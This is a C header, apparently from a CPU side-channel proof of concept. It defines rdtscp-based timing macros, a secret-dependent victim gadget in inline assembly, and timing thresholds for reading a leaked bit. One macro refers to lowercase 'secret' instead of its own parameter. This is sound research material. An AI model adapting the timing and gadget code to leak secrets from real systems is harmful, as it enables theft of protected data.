#pragma once

#include "config.h"

#ifdef GADGET_LAB
  #define ATTACKER_TIMING   asm("SPECULATE_THIS:;");      \
                            tsc = __rdtscp(&junk);        \
                            CRC32(32)                      \
                            tsc = __rdtscp(&junk) - tsc;

  #define VICTIM_GADGET(SECRET)        \
                            /* asm("movl $-1, %%r15d; divl %%r15d;" :::); */   \
                            asm("test $1, %[secret];"                     \
                                "jne MARK;" :: [secret] "r" (SECRET): );  \
                            CRC32(32)                                      \
                            /* asm("movl $-1, %%r12d; divl %%r12d;" :::); */ \
                            asm("MARK:;");                              \
                            OR(32)

  #define THRESHOLD_OP      <
  #define THRESHOLD         131
#else
  #define ATTACKER_TIMING   asm volatile (".rept 17; nop; .endr;"     \
                                          "SPECULATE_THIS:;");        \
                            tsc = __rdtscp(&junk);                    \
                            asm volatile ("	.rept 8;"                 \
                                          " btr %%r9d, %%r8d;"        \
                                          " btr %%r11d, %%r10d;"      \
                                          " bts %%r9d, %%r8d;"        \
                                          " bts %%r11d, %%r10d;"      \
                                          " .endr;":::);              \
                            tsc = __rdtscp(&junk) - tsc;

  #define VICTIM_GADGET(SECRET)        \
                            asm volatile ("	ELSE%=:"                              \
                                          "	add    $1, %%rax;"                    \
                                          "	add    $0x20, %%rdx;"                 \
                                          "	cmp    %%rax, -0x100(%%rbp);"         \
                                          "	je     END%=;"                        \
                                          "	cmp $0, %[secret];"                       \
                                          "	je     ELSE%=;"                       \
                                          "	mov    -0xb0(%%rbp), %%rdi;"          \
                                          "	mov    -0xf0(%%rbp), %%edx;"          \
                                          "	mov    (%%rdi, %%rax, 8), %%rax;"     \
                                          "	test   %%edx, %%edx;"                 \
                                          "	mov    %%rax, 0x50(%%rbx);"           \
                                          "	END%=:" :: [secret] "r" (secret) :);
int thres;
  #define THRESHOLD_OP      >
  #define THRESHOLD         48
#endif
                  